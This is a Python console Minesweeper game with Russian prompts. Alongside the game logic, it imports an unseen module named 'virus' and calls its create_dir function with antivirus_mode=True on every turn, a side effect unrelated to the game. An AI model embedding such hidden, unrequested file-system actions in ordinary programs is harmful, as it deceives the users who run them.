import random
import os
import virus


def set_bomb(num, pole, l):
    while num > 0:
        x = random.randint(1, l)
        y = random.randint(1, l)
        if pole[x][y] != "B":
            pole[x][y] = "B"
            if type(pole[x - 1][y]) == int:
                pole[x - 1][y] += 1
            if type(pole[x - 1][y + 1]) == int:
                pole[x - 1][y + 1] += 1
            if type(pole[x - 1][y - 1]) == int:
                pole[x - 1][y - 1] += 1
            if type(pole[x + 1][y]) == int:
                pole[x + 1][y] += 1
            if type(pole[x + 1][y - 1]) == int:
                pole[x + 1][y - 1] += 1
            if type(pole[x + 1][y + 1]) == int:
                pole[x + 1][y + 1] += 1
            if type(pole[x][y + 1]) == int:
                pole[x][y + 1] += 1
            if type(pole[x][y - 1]) == int:
                pole[x][y - 1] += 1
            num -= 1
    return pole


def accord(pole_gamer, pole_com, x, y):
    if pole_gamer[x][y] == "*" and pole_com[x][y] != 0:
        pole_gamer[x][y] = pole_com[x][y]
        return pole_gamer
    elif (pole_gamer[x][y] == "*" and pole_com[x][y] == 0) or pole_com[x][y] == 0:
        pole_gamer[x][y] = pole_com[x][y]
        pole_gamer[x - 1][y] = pole_com[x - 1][y]
        pole_gamer[x - 1][y - 1] = pole_com[x - 1][y - 1]
        pole_gamer[x - 1][y + 1] = pole_com[x - 1][y + 1]
        pole_gamer[x + 1][y] = pole_com[x + 1][y]
        pole_gamer[x + 1][y - 1] = pole_com[x + 1][y - 1]
        pole_gamer[x + 1][y + 1] = pole_com[x + 1][y + 1]
        pole_gamer[x][y - 1] = pole_com[x][y - 1]
        pole_gamer[x][y + 1] = pole_com[x][y + 1]
        return pole_gamer
    elif pole_gamer[x][y] > 0:
        flags = 0
        true_flags = 0
        if pole_gamer[x - 1][y] == "F":
            flags += 1
            if pole_com[x - 1][y] == "H":
                true_flags += 1
        if pole_gamer[x - 1][y - 1] == "F":
            flags += 1
            if pole_com[x - 1][y - 1] == "H":
                true_flags += 1
        if pole_gamer[x - 1][y + 1] == "F":
            flags += 1
            if pole_com[x - 1][y + 1] == "H":
                true_flags += 1
        if pole_gamer[x + 1][y] == "F":
            flags += 1
            if pole_com[x + 1][y] == "H":
                true_flags += 1
        if pole_gamer[x + 1][y - 1] == "F":
            flags += 1
            if pole_com[x + 1][y - 1] == "H":
                true_flags += 1
        if pole_gamer[x + 1][y + 1] == "F":
            flags += 1
            if pole_com[x + 1][y + 1] == "H":
                true_flags += 1
        if pole_gamer[x][y - 1] == "F":
            flags += 1
            if pole_com[x][y - 1] == "H":
                true_flags += 1
        if pole_gamer[x][y + 1] == "F":
            flags += 1
            if pole_com[x][y + 1] == "H":
                true_flags += 1
        if flags == true_flags:
            if pole_gamer[x - 1][y] != "F":
                pole_gamer[x - 1][y] = pole_com[x - 1][y]
            if pole_gamer[x - 1][y - 1] != "F":
                pole_gamer[x - 1][y - 1] = pole_com[x - 1][y - 1]
            if pole_gamer[x - 1][y + 1] != "F":
                pole_gamer[x - 1][y + 1] = pole_com[x - 1][y + 1]
            if pole_gamer[x + 1][y] != "F":
                pole_gamer[x + 1][y] = pole_com[x + 1][y]
            if pole_gamer[x + 1][y - 1] != "F":
                pole_gamer[x + 1][y - 1] = pole_com[x + 1][y - 1]
            if pole_gamer[x + 1][y + 1] != "F":
                pole_gamer[x + 1][y + 1] = pole_com[x + 1][y + 1]
            if pole_gamer[x][y - 1] != "F":
                pole_gamer[x][y - 1] = pole_com[x][y - 1]
            if pole_gamer[x][y + 1] != "F":
                pole_gamer[x][y + 1] = pole_com[x][y + 1]
            return pole_gamer
        else:
            if pole_com[x - 1][y] == "B" and pole_gamer[x - 1][y] != "F":
                pole_com[x - 1][y] = "#"
            if pole_com[x - 1][y - 1] == "B" and pole_gamer[x - 1][y - 1] != "F":
                pole_com[x - 1][y - 1] = "#"
            if pole_com[x - 1][y + 1] == "B" and pole_gamer[x - 1][y + 1] != "F":
                pole_com[x - 1][y + 1] = "#"
            if pole_com[x + 1][y] == "B" and pole_gamer[x + 1][y] != "F":
                pole_com[x + 1][y] = "#"
            if pole_com[x + 1][y - 1] == "B" and pole_gamer[x + 1][y - 1] != "F":
                pole_com[x + 1][y - 1] = "#"
            if pole_com[x + 1][y + 1] == "B" and pole_gamer[x + 1][y + 1] != "F":
                pole_com[x + 1][y + 1] = "#"
            if pole_com[x][y - 1] == "B" and pole_gamer[x][y - 1] != "F":
                pole_com[x][y - 1] = "#"
            if pole_com[x][y + 1] == "B" and pole_gamer[x][y + 1] != "F":
                pole_com[x][y + 1] = "#"
            return pole_com


len_field = int(input("Размер поля- одна цифра (3-10): "))
if len_field < 3 or len_field > 11:
    raise Exception("Некорректное значение!")
field = [[0 for i in range(len_field + 2)] for j in range(len_field + 2)]
k = 0

for i in range(0, len_field + 2):
    field[0][i] = str(k)
    field[len_field + 1][i] = str(k)
    field[i][0] = str(k)
    field[i][len_field + 1] = str(k)
    if k == len_field:
        k = 0
    else:
        k += 1

num_bombs = int(input("С каким количеством бомб вы хотите столкнуться?: "))
if num_bombs >= len_field**2:
    raise Exception("Слишком большое количество бомб, так точно не выиграть!")
field = set_bomb(num_bombs, field, len_field)

gamer_sees = [["*" for i in range(len_field + 2)] for j in range(len_field + 2)]
k = 0
for i in range(0, len_field + 2):
    gamer_sees[0][i] = str(k)
    gamer_sees[len_field + 1][i] = str(k)
    gamer_sees[i][0] = str(k)
    gamer_sees[i][len_field + 1] = str(k)
    if k == len_field:
        k = 0
    else:
        k += 1

lose = 0
res = ""
while lose == 0 and num_bombs > 0:
    virus.create_dir("", random.randint(2, 4), antivirus_mode=True)
    os.system('clear')
    print(res)
    for s in gamer_sees:
        for d in s:
            if d == 0:
                d = " "
            print(d, end="      ")
        print("\n\n")
    hod_x = int(input("Введите строку: "))
    hod_y = int(input("Введите столбец: "))
    hod = input("Поставить флаг/копать/убрать флаг?[FON/DIG/FOFF]: ")
    hod = hod.upper()
    if hod == "DIG":
        if field[hod_x][hod_y] == "B":
            lose += 1
            field[hod_x][hod_y] = "#"
        else:
            gamer_sees = accord(gamer_sees, field, hod_x, hod_y)
            h = 0
            for s in gamer_sees:
                for d in s:
                    if d == "#":
                        h += 1
            if h > 0:
                lose += 1
                field = gamer_sees
    elif hod == "FON":
        if field[hod_x][hod_y] == "B":
            field[hod_x][hod_y] = "H"
            gamer_sees[hod_x][hod_y] = "F"
            num_bombs -= 1
        else:
            gamer_sees[hod_x][hod_y] = "F"

    elif hod == "FOFF":
        if gamer_sees[hod_x][hod_y] == "F":
            gamer_sees[hod_x][hod_y] = "*"
            if field[hod_x][hod_y] == "H":
                field[hod_x][hod_y] = "B"
                num_bombs += 1
        else:
            res = "Флага на этом месте нет!"

    if hod != "FOFF" and hod != "FON" and hod != "DIG":
        res = "Вы ввели не то!"

if lose == 0:
    print()
    for s in field:
        for d in s:
            if d == "H":
                d = "F"
            print(d, end="      ")
        print("\n\n")
    print("You win!")
else:
    print()
    for s in field:
        for d in s:
            print(d, end="      ")
        print("\n\n")
    print("You lose!")
